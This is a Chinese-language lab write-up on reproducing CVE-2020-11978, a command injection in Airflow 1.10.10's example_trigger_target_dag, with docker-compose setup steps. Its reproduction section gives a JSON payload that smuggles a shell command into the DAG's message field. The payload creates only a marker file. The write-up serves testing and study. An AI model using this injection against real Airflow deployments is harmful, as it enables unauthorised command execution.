# Airflow 1.10.10 CVE-2020-11978 示例dag中的命令注入

airflow是一款开源的，分布式任务调度框架，它将一个具有上下级依赖关系的工作流，组装成一个有向无环图。Airflow的配置中使用CeleryExecutor进行任务执行，所以命令执行结果需要在CeleryWorker所在容器中进行查看。

由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。

参考链接：

- https://docs.celeryproject.org/en/stable/userguide/configuration.html
- https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk
- https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers
- https://www.jianshu.com/p/52552c075bc0
- https://www.runoob.com/w3cnote/python-redis-intro.html
- https://blog.csdn.net/SKI_12/article/details/85015803

## 漏洞环境

依次执行如下命令启动airflow 1.10.10

```bash
#初始化数据库
docker-compose run airflow-init initdb

#启动服务
docker-compsoe up -d
```

## 漏洞复现

访问`http://your-ip:8080`进入airflow管理端，将`example_trigger_target_dag`前面的Off改为On：

![](1.png)

再点击执行按钮，在Configuration JSON中输入：`{"message":"'\";touch /tmp/airflow_dag_success;#"}`，再点`Trigger`执行dag：

![](2.png)

等几秒可以看到执行成功：

![](3.png)

到CeleryWorker容器中进行查看：

```bash
docker-compose exec airflow-worker ls -l /tmp
```

可以看到`touch /tmp/airflow_dag_success`成功被执行：

![](4.png)
